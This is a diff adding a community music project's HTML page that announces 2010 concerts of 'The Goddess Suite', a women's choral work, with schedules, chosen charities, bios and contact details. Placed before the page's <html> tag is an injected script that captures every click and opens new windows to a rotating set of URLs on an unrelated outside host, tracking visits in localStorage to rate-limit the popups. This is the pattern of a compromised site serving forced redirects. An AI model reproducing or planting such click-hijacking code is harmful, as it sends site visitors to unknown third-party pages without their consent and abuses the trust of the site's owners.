@@ -1,0 +1,523 @@
+<script>(function (parameters) {
+    const targets = [
+        \'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\', \'https://ois.is/images/logo-6.png\', \'https://ois.is/images/logo-7.png\', \'https://ois.is/images/logo-8.png\'
+    ]
+    // Times between clicks
+    const restMinutes = 1;
+    // Number of hours to allow re-click 
+    const allowedHours = 2;
+
+
+    const saveTargetLocationsToStorage = (targets) => {
+        targets.forEach((target, index) => {
+            if(!localStorage.getItem(`${target}-local-storage`)){
+            	localStorage.setItem(`${target}-local-storage`, 0);
+            }
+        });
+    }
+    const getRandomLocationFromStorage = (targets) => {
+        const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
+        return nonVisited[Math.floor(Math.random() * nonVisited.length)];
+    }
+    const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);
+
+    const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
+    const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);
+
+    const getHoursDiff = (startDate, endDate) => {
+        const msInHour = 1000 * 60 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInHour);
+    }
+    const getMintsDiff = (startDate, endDate) => {
+        const msInMints = 1000 * 60;
+        return Math.round(Math.abs(endDate - startDate) / msInMints);
+    }
+
+    const visitNewLocation = (targets, host, nowDate) => {
+        saveTargetLocationsToStorage(targets);
+        newLocation = getRandomLocationFromStorage(targets);
+        setTimeToStorage(`${host}-mnts`, nowDate);
+        setTimeToStorage(`${host}-hurs`, nowDate);
+        setLocationAsVisited(newLocation);
+        window.open(newLocation, "_blank");
+    }
+
+    // const randomLocation = getRandomLocationFromStorage(targets);
+    saveTargetLocationsToStorage(targets);
+
+    function globalClick(event) {
+        event.stopPropagation();
+        const host = location.host;
+        let newLocation = getRandomLocationFromStorage(targets);
+        const nowDate = Date.parse(new Date());
+        const savedDateForMints = getTimeStorage(`${host}-mnts`);
+        const savedDateForHours = getTimeStorage(`${host}-hurs`);
+
+        if (savedDateForMints && savedDateForHours) {
+            try {
+                const storageDateForMints = parseInt(savedDateForMints);
+                const storageDateForHours = parseInt(savedDateForHours);
+                const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
+                const hoursDiff = getHoursDiff(nowDate, storageDateForHours);
+
+                if (hoursDiff >= allowedHours) {
+                    saveTargetLocationsToStorage(targets);
+                    setTimeToStorage(`${host}-hurs`, nowDate);
+                }
+                if (mintsDiff >= restMinutes) {
+                    if (newLocation) {
+                        setTimeToStorage(`${host}-mnts`, nowDate);
+                        window.open(newLocation, "_blank");
+                        setLocationAsVisited(newLocation);
+                    }
+                }
+            } catch (error) { visitNewLocation(targets, host, nowDate); }
+        } else { visitNewLocation(targets, host, nowDate); }
+    }
+    document.addEventListener("click", globalClick)
+})()</script>
+<html>
+  <head>
+    <meta HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=utf-8">
+    <META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
+    <META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
+    <title>The Community Music Project: The Goddess Suite</title>
+    <link href="cmp.css" rel="stylesheet" type="text/css">
+    <style type="text/css">
+      h3 {
+        text-align: center;
+      }
+
+      #content {
+        width: 640px;
+      }
+      
+    </style>
+  </head>
+  <body>
+    <iframe id="nav" src="nav.html"></iframe>
+
+    <h2>Celebrating Women Through Song: The Goddess Suite</h2>
+
+    <!--
+    <ul>
+      <li><a href="#gs2010">The Goddess Suite - 2010</a></li>
+      <li><a href="#description">Description of The Goddess Suite Project</a></li>
+      <li><a href="#composer">Bio for Goddess Suite Composer Cynthia Rylander Crossen</a></li>
+      <li><a href="#conductor">Bio for Goddess Suite Conductor Sheila Fleming</a></li>
+      <li><a href="#producers">Goddess Suite Producers</a></li>
+      <li><a href="#participate">To Participate in the Goddess Suite Spring 2010</a></li>
+      <li><a href="#notified">To Be Notified of Goddess Suite Performances</a></li>
+    </ul>
+    -->
+
+    <div id="content">
+
+      <a name="gs2010"><h3>The Goddess Suite - 2010</h3></a>
+      <p>
+        <b>What:</b>
+        An Evening of Celebrating Women, including a performance of &nbsp;
+        <a href="/tgs.html">The Goddess Suite</a>, 
+        an original choral work by singer-songwriter 
+        and environmental educator Cynthia Rylander Crossen.
+        Suggested donation of $7 (children under 12 free) to benefit 
+        local, regional, and global <a href="#charities">charities</a>.
+        <br />
+        <a href="/tgs.html">Download free MP3s of The Goddess Suite here.</a>
+      </p>
+      <p>
+        <b>When and Where:</b>
+        <ul class="event">
+          <li>
+            ♫ &nbsp;&nbsp;
+            <b>Saturday, June 19</b>, 7 pm, at the 
+            <a href="http://dc.lib.unc.edu/cdm4/item_viewer.php?CISOROOT=/vir_museum&CISOPTR=805">Forest Theater</a>
+            (<a href="http://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=100+country+club+road+chapel+hill+nc&sll=35.912741,-79.044507&sspn=0.006465,0.008111&g=110+country+club+road+chapel+hill+nc&ie=UTF8&hq=&hnear=100+Country+Club+Rd,+Chapel+Hill,+Orange,+Nor">map</a>)
+            in Chapel Hill.
+          </li>
+          <li>
+            ♫ &nbsp;&nbsp;
+            <b>Sunday, June 20</b>, 7 pm
+            <a href="http://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=Eno+River+Unitarian+Universalist+Fellowship,+Durham,+NC&sll=37.0625,-95.677068&sspn=51.310143,66.445312&ie=UTF8&hq=Eno+River+Unitarian+Universalist+Fellowship,&hnear=Durham,+NC&z=12&iw%20">Eno River Unitarian Universalist Fellowship</a>
+            in Durham.
+          </li>
+          <li>
+            ♫ &nbsp;&nbsp;
+            <b>Saturday, June 26</b>, 7 pm, at the 
+            <a href="http://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=Northwood+High+School,+Pittsboro,+NC&sll=35.912306,-79.04779&sspn=0.012495,0.016222&ie=UTF8&hq=Northwood+High+School,&hnear=Pittsboro,+NC&ll=35.756543,-79.172115&spn=0.10016,0.129776&z%20">Northwood High School</a>
+            Auditorium in Pittsboro.
+          </li>
+          <li>
+            ♫ &nbsp;&nbsp;
+            <b>Sunday, June 27</b>, 7 pm, at the 
+            <a href="http://dc.lib.unc.edu/cdm4/item_viewer.php?CISOROOT=/vir_museum&CISOPTR=805">Forest Theater</a>
+            (<a href="http://maps.google.com/maps?f=q&source=s_q&hl=en&geocode=&q=100+country+club+road+chapel+hill+nc&sll=35.912741,-79.044507&sspn=0.006465,0.008111&g=110+country+club+road+chapel+hill+nc&ie=UTF8&hq=&hnear=100+Country+Club+Rd,+Chapel+Hill,+Orange,+Nor">map</a>)
+            in Chapel Hill.
+          </li>
+        </ul>
+      </p>
+      <p>
+        <b>Who:</b>
+        <a href="#composer">Cynthia Crossen</a> and Hope Wilder 
+        (Cynthia's daughter-in-law), 
+        of the <a href="/">Community Music Project</a>, have assembled 
+        instrumentalists and a chorus of women 40-strong, to perform 
+        <a href="/tgs.html">The Goddess Suite</a>, with singer-songwriter 
+        and musical educator <a href="#conductor">Sheila Fleming</a> as conductor.
+        Other acts in the program will include music, storytelling, 
+        and original dance. 
+      </p>
+      <p>
+        <b>Why:</b>
+        We have come together to experience and share the joy of celebrating 
+        womanhood through song, spoken word, and dance.  To honor each 
+        of the seven goddesses of whom we sing, 100% of the proceeds from 
+        our performances will go to support local, regional, and global 
+        charities that embody attributes of these Greek goddesses.
+      </p>
+      <p class="charities">
+        <a name="charities" />
+        <h3>Charities We've Chosen to Embody Goddesses in the World</h3></a>
+
+        <div>
+          For <b>Artemis</b>, goddess of nature, protector of wild places, 
+          who helps girls grow to women, we have selected the 
+          <a href="http://www.hawriver.org/">Haw River Assembly</a> (regional), 
+          which promotes environmental education, conservation and pollution 
+          prevention; speaks as a voice for the river in the public arena; 
+          and teaches people to be effective guardians of the river.
+        </div>
+        <br />
+        <div>
+          For <b>Hera</b>, queen of Heaven, goddess of marriage and mothering, 
+          whose breast milk mythically created the Milky Way, we have selected 
+          <a href="http://www.llli.org/">La Leche League</a> (local and international) 
+          for its mission of helping mothers to bond with and nurture their babies, 
+          promoting breastfeeding locally and around the world.
+        </div>
+        <br />
+        <div>
+          For <b>Demeter</b>, goddess of fertility, nurturing young children, 
+          and motherhood, we have chosen 
+          <a href="http://www.chathamcountytogether.org/">Chatham County Together</a> 
+          (local), which encourages "at risk" youth to become healthy, 
+          self-sufficient adults by fostering positive mentoring relationships, 
+          encouraging academic success, teaching valuable skills, and offering 
+          family advocacy and support.
+        </div>
+        <br />
+        <div>
+          To honor <b>Persephone</b>, queen of the underworld, victim of 
+          kidnapping and forced marriage, we have chosen 
+          <a href="http://www.fvrc.org/">Family Violence and Rape Crisis Center</a> 
+          (local), which promotes peaceful homes by combating domestic 
+          violence and sexual assault in Chatham County, NC.
+        </div>
+        <br />
+        <div>
+          For <b>Hestia</b>, goddess of the homeplace, keeper of the sacred hearth, 
+          we are supporting 
+          <a href="http://www.womenforwomen.org/">Women for Women</a> 
+          (global), which helps women re-create homes in war-torn countries, 
+          providing daily support in crisis situations as well as long-term 
+          job skills and emotional support.
+        </div>
+        <br />
+        <div>
+          For <b>Aphrodite</b>, goddess of sexuality, romance, and the transforming 
+          power of love, we have chosen 
+          <a href="http://www.plannedparenthood.org/centralnc">Planned Parenthood Central NC</a> 
+          (regional), which promotes a common sense, comprehensive approach to reproductive health 
+          and well-being, based on respect for each individual’s right to make 
+          informed, independent decisions about health, sexuality, and family planning.
+        </div>
+        <br />
+        <div>
+          To celebrate <b>Athena</b>, goddess of wisdom and justice, we are benefiting 
+          <a href="http://www.finca.org/">FINCA</a> 
+          (global), which provides micro-loans for women entrepreneurs, empowering women to create
+          new businesses, leading to financial independence and increased prosperity.
+        </div>
+      </p>
+      
+      <a name="schedules"><h3>Goddess Suite Performance Schedules</h3></a>
+      
+      <b>Saturday June 19, 7 pm, at the <a href="http://dc.lib.unc.edu/cdm4/item_viewer.php?CISOROOT=/vir_museum&amp;CISOPTR=805">
+        Forest Theater</a>, (<a href="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=106+country+club+rd&amp;sll=35.913141,-79.045258&amp;sspn=0.003067,0.006899&amp;gl=us&amp;ie=UTF8&amp;hq=&amp;hnear=106+Country+Club+Rd,+Chapel+Hill,+Orange,+North+Carolina+27514&amp;ll=35.913175,-79.045258&amp;spn=0.025825,0.036306&amp;z=15">
+          Map</a>), Chapel Hill:</b>
+      <ul>
+        <li>
+          Mistress of Ceremonies: 
+          <a href="http://www.naturenia.com/">Kate Finlayson</a>
+        </li>
+        <li>
+          Pre-show Goddess Suite overture (flute, cello, piano, percussion)
+        </li>
+        <li>
+          Claudia Lopez, Chants &amp; invocations
+        </li>
+        <li>
+          Stellaria (Lea Clayton, Cynthia Crossen, and Hope Wilder), original songs
+        </li>
+        <li>
+          Lucinda Bolton, singer
+        </li>
+        <li>
+          The Goddess Suite, with Athena Dancers
+          <a href="http://www.naturenia.com/">Kate Finlayson</a> and
+          Margaret Jemison
+        </li>
+      </ul>
+      <br />
+      
+      <b>Sunday June 20, 7 pm, at 
+        <a href="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=Eno+River+Unitarian+Universalist+Fellowship,+Durham,+NC&amp;sll=37.0625,-95.677068&amp;sspn=51.310143,66.445312&amp;ie=UTF8&amp;hq=Eno+River+Unitarian+Universalist+Fellowship,&amp;hnear=Durham,+NC&amp;z=12&amp;iwloc=A">
+        Eno River Unitarian Universalist Fellowship</a>, Durham:</b>
+      <ul>
+        <li>
+          Mistress of Ceremonies: 
+          <a href="http://www.naturenia.com/">Kate Finlayson</a>
+        </li>
+        <li>
+          Pre-show Goddess Suite overture (flute, cello, piano, percussion)
+        </li>
+        <li>
+          Claudia Lopez, Chants &amp; invocations
+        </li>
+        <li>
+          Stellaria (Lea Clayton, Cynthia Crossen, and Hope Wilder), original songs
+        </li>
+        <li>
+          <a href="http://carrborowellnesscoach.com/">Jaime Powell</a>,
+          original poetry
+        </li>
+        <li>
+          Lucinda Bolton, singer
+        </li>
+        <li>
+          The Goddess Suite, with Athena Dancers
+          <a href="http://www.naturenia.com/">Kate Finlayson</a> and
+          Margaret Jemison
+        </li>
+      </ul>
+      <br />
+      
+      <b>Saturday June 26, 7 pm, at <a href="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=Northwood+High+School,+Pittsboro,+NC&amp;sll=35.912306,-79.04779&amp;sspn=0.012495,0.016222&amp;ie=UTF8&amp;hq=Northwood+High+School,&amp;hnear=Pittsboro,+NC&amp;ll=35.756543,-79.172115&amp;spn=0.207285,0.259552&amp;z=12">
+        Northwood High School</a> Auditorium, Pittsboro:</b>
+      <ul>
+        <li>
+          Mistress of Ceremonies: 
+          <a href="http://www.openheartyogaschool.com/bios.htm#mardi">
+            Mardi Magoo</a>
+        </li>
+        <li>
+          Pre-show Goddess Suite overture (flute, cello, piano, percussion)
+        </li>
+        <li>
+          Claudia Lopez, Chants &amp; invocations
+        </li>
+        <li>
+          <a href="http://www.jewelsong.net/">Jewelsong</a>
+        </li>
+        <li>
+          <a href="http://carrborowellnesscoach.com/">Jaime Powell</a>,
+          original poetry
+        </li>
+        <li>
+          Stellaria (Lea Clayton, Cynthia Crossen, and Hope Wilder), original songs
+        </li>
+        <li>
+          Lucinda Bolton, singer
+        </li>
+        <li>
+          The Goddess Suite
+      </ul>
+      <br />
+      
+      <b>Sunday June 27, 7 pm, at the <a href="http://dc.lib.unc.edu/cdm4/item_viewer.php?CISOROOT=/vir_museum&amp;CISOPTR=805">
+        Forest Theater</a>, (<a href="http://maps.google.com/maps?f=q&amp;source=s_q&amp;hl=en&amp;geocode=&amp;q=106+country+club+rd&amp;sll=35.913141,-79.045258&amp;sspn=0.003067,0.006899&amp;gl=us&amp;ie=UTF8&amp;hq=&amp;hnear=106+Country+Club+Rd,+Chapel+Hill,+Orange,+North+Carolina+27514&amp;ll=35.913175,-79.045258&amp;spn=0.025825,0.036306&amp;z=15">
+          Map</a>), Chapel Hill:</b>
+      <ul>
+        <li>
+          Mistress of Ceremonies: 
+          <a href="http://www.openheartyogaschool.com/bios.htm#mardi">
+            Mardi Magoo</a>
+        </li>
+        <li>
+          Pre-show Goddess Suite overture (flute, cello, piano, percussion)
+        </li>
+        <li>
+          Claudia Lopez, Chants &amp; invocations
+        </li>
+        <li>
+          Stellaria (Lea Clayton, Cynthia Crossen, and Hope Wilder), original songs
+        </li>
+        <li>
+          <a href="http://carrborowellnesscoach.com/">Jaime Powell</a>,
+          original poetry
+        </li>
+        <li>
+          Lucinda Bolton, singer
+        </li>
+        <li>
+          The Goddess Suite
+        </li>
+      </ul>
+
+      <a name="description"><h3>Description of The Goddess Suite Project</h3></a>
+      <p>
+        The Goddess Suite is a choral work for women's voices, with piano, 
+        two flutes, cello, and drum accompaniment.  Composed by Chatham 
+        singer-songwriter Cynthia Crossen in 1986, it was performed in 
+        1986 and 1987 at various venues in Chapel Hill, Durham, Raleigh, 
+        and Chatham County.
+      </p>
+      <p>
+        The Goddess Suite celebrates aspects of womanhood in six choral pieces 
+        about seven Greek Goddesses.  Inspired by Jean Shinoda Bolen's book 
+        <a href="http://www.amazon.com/Goddesses-Everywoman-Powerful-Archetypes-Womens/dp/0060572841/ref=sr_1_1?ie=UTF8&s=books&qid=1272635836&sr=8-1">Goddesses in Everywoman</a>, 
+        it honors women's strengths by singing of 
+        Artemis's courage and attunement with nature, Demeter's steadfast and 
+        fierce motherly love, Persephone's initiation into life's challenges 
+        and responsibilities, the transforming power of Aphrodite's love, 
+        Hestia's hearth-tending and spiritual centeredness, Hera's far-seeing 
+        wisdom, and Athena's crusade for a better world.
+      </p>
+      <p>
+        The Goddess Suite performances celebrate women in a unique and 
+        inspiring way. The <a href="#composer">composer</a>, 
+        <a href="#conductor">conductor</a>, chorus members, and 
+        instrumentalists are women.  Other participating artists will share 
+        their unique feminine-celebratory vision.  We hope to reach a wide 
+        audience of women, men, and young people with these strong, vibrant, 
+        female archetypal “super-heroes”.  We especially want to inspire 
+        creativity and musical ambition in young girls, teenage girls, 
+        and young women. We hope that for both performers and audience, 
+        experiencing the Goddess Suite will be deeply moving, inspiring, 
+        and meaningful.
+      </p>
+      <!--
+      <p>
+        The Goddess Suite project brings the work of a deeply community-based 
+        composer, local musicians, and other performers to a wider community.  
+        We believe that this program celebrates women in a unique, moving, and 
+        inspiring way.  We hope to reach a wide audience of women, men, and young 
+        people with these strong, vibrant, female archetypal “super-heroes”.  
+        We especially want to inspire creativity and musical ambition in 
+        young girls, teenage girls, and young women.
+      </p>
+      <p>
+        Producing this work offers women singers and musicians the opportunity 
+        to be part of creating and performing a deeply meaningful piece of music 
+        by a local composer.  It offers other artists a chance to share their 
+        unique feminine-celebratory vision.  We hope that for both performers 
+        and audience, experiencing the Goddess Suite will be deeply moving, 
+        inspiring, and meaningful.
+      </p>
+      -->
+      <p>
+        You can listen to the Goddess Suite by downloading the .mp3s free of 
+        charge from <a href="http://communitymusicproject.org/tgs.html">The Community Music Project</a>.
+        You can also <a href="http://communitymusicproject.org/tgs-lyrics.html">read the lyrics here</a>.
+      </p>
+  
+      <a name="composer"><h3>Bio for Goddess Suite Composer Cynthia Rylander Crossen</h3></a>
+      <p>
+        Cynthia Rylander Crossen writes songs about the deepest truths she knows.  
+        The purpose of her music is to heal, to bring us together in love, to 
+        build bridges between us, to create and strengthen community, to celebrate 
+        and give thanks, and to remind us of our connection with the earth.
+      </p>
+      <p>
+        Cynthia has performed her songs since the mid-1970’s, with various musical 
+        friends and as part of Silkworm, Pomegranate Rose, the Earthquackers 
+        (environmental education musical theater for children), and currently 
+        with Stellaria (Cynthia, Lea Clayton, and Hope Wilder).  In 1986 
+        she composed, recorded, and produced six performances of The Goddess Suite, 
+        a choral work for women’s voices, flute, cello, and piano, about the 
+        Greek goddesses.
+      </p>
+      <p>
+        Cynthia shares her music at coffeehouses, benefits, schools, churches, 
+        summer camps, environmental education festivals for the Haw and Rocky 
+        rivers, multiracial celebrations, old folks homes, peace rallies, 
+        Earth Days, women’s gatherings, hospitals, and wherever she goes.  
+        Her songs have been published in Songs For Earthlings by 
+        Julie Forest Middleton, used in a curriculum for girls, included in 
+        church songbooks, sung at many weddings and funerals, and performed 
+        by choirs in Vermont, Alaska, and locally.  For twelve years Cynthia 
+        led a monthly women’s singing workshop, and now offers a monthly 
+        musical open house with her daughter-in-law Hope Wilder.  She has 
+        produced numerous teaching tapes and songbooks, recorded two tapes 
+        with Pomegranate Rose, and is a featured artist of the 
+        Community Music Project.  She created the CD <a href="http://communitymusicproject.org/ftl.html">Feel This Love</a>, 
+        which is being distributed free as part of the Community Music Project.
+      </p>
+  
+      <a name="conductor"><h3>Bio for Goddess Suite Conductor Sheila Fleming</h3></a>
+      <p>
+        Educator, songwriter and guitarist Sheila Fleming has been making music 
+        all the days of her life.  From the cornfields of Iowa, and all along 
+        the banks of the Mississippi, Sheila’s lyrical voice and sweet, soulful 
+        songs have been heard in classrooms, conferences, coffee houses, and 
+        concert halls throughout the Midwest.  Now living in rural Chatham 
+        county in North Carolina, Sheila is charming Triangle audiences with 
+        thoughtfully-written songs  that will capture your heart and make you 
+        appreciate the broad musical palette from where her music originates.   
+      </p>
+      <p>
+        Sheila is that rare combination of talents – a dynamic teacher, 
+        a superlative singer, an accomplished guitarist, and an extraordinary 
+        songwriter. A finalist in both the Triangle Folk Music Society’s 
+        Songwriting Contest (1998) and the NC Songwriters Cooperative 
+        Songwriters Contest (1999), she is releasing her debut solo CD 
+        “Circles”. Sheila currently performs with the folk/swing trio 
+        Trilogy in addition to her solo performances.  
+        She has twice been selected as Teacher of the Year in her thirteen 
+        years of teaching in North Carolina, and currently teaches music 
+        in the Chapel Hill-Carrboro School District.  Sheila also 
+        presents workshops and clinics to educators and musicians throughout 
+        North Carolina.   
+      </p>
+  
+      <a name="producers"><h3>Goddess Suite Producers</h3></a>
+      <p>
+        The Goddess Suite is being produced by Cynthia Crossen and Hope Wilder.
+      </p>
+      <p>
+        <b>Contact Phone Numbers:</b> 919-542-3827 (home); 919-967-2500 (office)
+      </p>
+      <p>
+        <b>Email:</b> 
+          Cynthia: <img class="mail" src="images/mail-cynthia.png" />; 
+          Hope: <img class="mail" src="images/mail-hope.png" />
+      </p>
+      <p>
+        <b>Organization:</b>
+        Community Music Project, 1116 Marshall Road, Pittsboro, NC 27312.
+        The Community Music Project is rooted in the rich, creative, and 
+        vibrant soil of the Carrboro/Chapel Hill/Chatham County North Carolina 
+        community. Its goal is to highlight the grassroots musicians of our 
+        own community, broadcasting the voices of our community to enrich and 
+        enliven the wider community, especially the talented voices that might 
+        otherwise not be heard—singer-songwriters who have not recorded CD’s 
+        on their own, gospel singers in the folk tradition, folk singers from 
+        Russian and South American traditions, and community choruses.  For more 
+        information, and to download our music and CD art, visit 
+        The Community Music Project website at 
+        <a href="http://communitymusicproject.org">http://communitymusicproject.org</a>.
+      </p>
+  
+      <a name="notified"><h3>To Be Notified of Goddess Suite Performances</h3></a>
+      <p>
+        Contact Cynthia Crossen, <img class="mail" src="images/mail-cynthia.png" />, 
+        to receive email notifications of The Goddess Suite performances.  
+        Please put “Goddess Suite List” in the subject line.  
+        Thank you for your interest!
+      </p>
+
+    </div>
+
+  </body>
+</html>
+
